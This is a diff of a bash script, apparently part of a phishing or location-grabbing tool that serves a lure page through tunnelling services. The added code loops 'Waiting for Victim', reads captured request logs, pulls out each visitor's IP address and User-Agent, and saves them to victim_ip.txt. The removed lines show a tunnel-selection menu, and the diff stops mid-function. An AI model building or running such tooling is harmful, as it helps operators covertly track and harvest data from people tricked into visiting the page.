@@ -1,28 +1,31 @@
-glocation() {
+glocfound() {
 
-printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Localhost.run\e[0m\n"
-d_o_server="1"
-printf "\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' gloc_option_server
-gloc_option_server="${gloc_option_server:-${gloc_d_o_server}}"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Victim ,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+while [ true ]; do
 
-if [[ $gloc_option_server == 1 || $gloc_option_server == 01 ]]; then
-start_ngrok_gloc
-elif [[ $gloc_option_server == 2 || $gloc_option_server == 02 ]]; then
-start_serveo_golc
-elif [[ $gloc_option_server == 3 || $gloc_option_server == 03 ]]; then
-start_localhostrun_golc
 
-else
-printf " \n\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
-sleep 1
-banner
-menu
+if [[ -e ".server/location/ip.txt" ]]; then
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
+printf "\e[0m\n"
+gloc_catch_ip
+
 fi
+sleep 1
+done 
 
 }
-start_ngrok_gloc() {
+gloc_catch_ip() {
+
+touch location.txt
+glocip=$(grep -a 'IP:' .server/location/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+glocua=$(grep 'User-Agent:' .server/location/ip.txt | cut -d '"' -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP :\e[0m\e[1;96m %s\e[0m\n" $glocip
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m User-Agent :\e[0m\e[1;96m %s\e[0m\n" $glocua
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m victim_ip.txt\e[0m\n"
+cat .server/location/ip.txt >> victim_ip.txt
 
